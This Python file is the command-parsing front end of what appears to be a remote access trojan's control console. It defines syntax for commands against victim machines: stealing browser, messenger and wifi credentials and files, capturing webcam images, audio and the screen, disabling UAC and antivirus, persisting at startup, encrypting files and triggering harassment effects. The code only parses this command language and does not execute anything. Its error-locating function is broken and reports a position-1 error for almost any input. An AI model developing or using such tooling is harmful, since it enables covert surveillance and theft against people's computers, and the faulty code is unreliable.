import re

# Define command patterns based on the provided command list
commands = {
    'ping': r'^ping\s+"(?P<device_name>[\w\d]+)"$',
    'locate': r'^locate\s+"(?P<device_name>[\w\d]+)"(?P<modes>(?:\s+-(?:ip|gps|igps))*)$',
    'taskmgr': r'^taskmgr\s+"(?P<device_name>[\w\d]+)"(?P<actions>(?:\s+-(?:opn|cls|on|off))*)$',
    'uac': r'^uac\s+"(?P<device_name>[\w\d]+)"(?P<actions>(?:\s+-(?:on|off))*)$',
    'regedit': r'^regedit\s+"(?P<device_name>[\w\d]+)"(?P<actions>(?:\s+-(?:on|off))*)$',
    'explorer': r'^explorer\s+"(?P<device_name>[\w\d]+)"(?P<actions>(?:\s+-(?:opn|cls|on|off))*)$',
    'conpan': r'^conpan\s+"(?P<device_name>[\w\d]+)"(?P<actions>(?:\s+-(?:on|off))*)$',
    'blockurl': r'^blockurl\s+"(?P<device_name>[\w\d]+)"\s+-(?P<urls>all|"[\w\d.]+")$',
    'unblockurl': r'^unblockurl\s+"(?P<device_name>[\w\d]+)"\s+-(?P<urls>all|"[\w\d.]+")$',
    'opensite': r'^opensite\s+"(?P<device_name>[\w\d]+)"\s+"(?P<site>[\w\d.]+)"$',
    'blockprcss': r'^blockprcss\s+"(?P<device_name>[\w\d]+)"(?P<processes>(?:\s+-(?:add\s+"[\w\d]+")|(?:strt|stp|del\s+"[\w\d]+")|(?:del\s+all))*)$',
    'video': r'^video\s+"(?P<device_name>[\w\d]+)"\s+(?P<seconds>\d+)\s+-(mp4|mov)$',
    'audio': r'^audio\s+"(?P<device_name>[\w\d]+)"\s+(?P<seconds>\d+)\s+-(mp3|wav)$',
    'wbcmimg': r'^wbcmimg\s+"(?P<device_name>[\w\d]+)"\s+-(jpg|png)$',
    'scrnsht': r'^scrnsht\s+"(?P<device_name>[\w\d]+)"\s*(?P<screen>\d*)\s+-(jpg|png)$',
    'scrnrcd': r'^scrnrcd\s+"(?P<device_name>[\w\d]+)"\s+(?P<seconds>\d+)\s+-(mp4|mov)$',
    'antivrs': r'^antivrs\s+"(?P<device_name>[\w\d]+)"$',
    'pcinfo': r'^pcinfo\s+"(?P<device_name>[\w\d]+)"$',
    'steal': (
        r'^steal\s+"(?P<device_name>[\w\d]+)"(?P<options>(?:\s+-(?:browser\s+\d+|launcher\s+\d+|docs|applist|wifi|'
        r'messenger\s+\d+|file\s+"[^"]+"|dir\s+"[^"]+"))+)$'
    ),
    'onchat': r'^onchat\s+"(?P<device_name>[\w\d]+)"(?P<options>(?:\s+-(?:killafter\s+\d+|fullscreen|unclosable))*)$',
    'remoteplay': (
        r'^remoteplay\s+"(?P<device_name>[\w\d]+)"(?P<options>(?:\s+-(?:full|screenshare\s+\d+|keyboard\s+\S+|volume\s+\d+|'
        r'shutdown|restart|bsod|logout|mousebuttonchange|crazymouse|changewallpaper|altf4|todesktop|screamer|textonscreen))*)$'
    ),
    'dir': (
        r'^dir\s+"(?P<device_name>[\w\d]+)"(?P<options>(?:\s+-(?:exe|full|newfolder|delfolder\s+"[^"]+"|delfile\s+"[^"]+"|'
        r'openfile\s+"[^"]+"|goto\s+"[^"]+"|cutfile\s+"[^"]+"|renamefile\s+"[^"]+"\s+"[^"]+"|getsize\s+"[^"]+"|'
        r'encryptfile\s+"[^"]+"))*)$'
    ),
    'updatecode': r'^updatecode\s+-(all|"(?P<device_name>[\w\d]+)")$',
    'startup': r'^startup\s+"(?P<device_name>[\w\d]+)"(?P<options>(?:\s+-(reg|taskmgr|services|tasksheduler))*)\s+-(on|off)$',
    'sendfile': r'^sendfile\s+-(all|"(?P<device_name>[\w\d]+)")\s+-(vid|audio|pic|file\s+"(?P<file>.+?)")$',
    'help': r'^help\s+-(getdevicename\s+"(?P<ip>[\d.]+)"|commandslist|whatsapplied)$',
}


def parse_command(input_text):
    """Parse the input text and identify command type and parameters."""
    for command, pattern in commands.items():
        match = re.match(pattern, input_text)
        if match:
            # Extract matched groups
            result = match.groupdict()

            # Process multi-flag fields to split into lists
            for key in ['modes', 'actions', 'options', 'processes']:
                if result.get(key):
                    result[key] = [flag.strip() for flag in result[key].split('-') if flag.strip()]

            response = f"{command} command identified with parameters: {result}"
            return response

    # If no command matches, find the first error location
    error_message = find_error(input_text)
    return f"Error: {error_message}"


def find_error(input_text):
    """Identify where the command format does not match any known command."""
    for command, pattern in commands.items():
        regex = re.compile(pattern)
        for i in range(len(input_text)):
            # Try to match the regex up to the current character
            if regex.match(input_text[:i + 1]) is None:
                return f"Syntax error at position {i + 1}: '{input_text[i]}'"
    return "Unknown command or syntax error."


# Example usage
while True:
    user_input = input("Enter command: ")
    if user_input.lower() == 'exit':
        break
    result = parse_command(user_input)
    print(result)
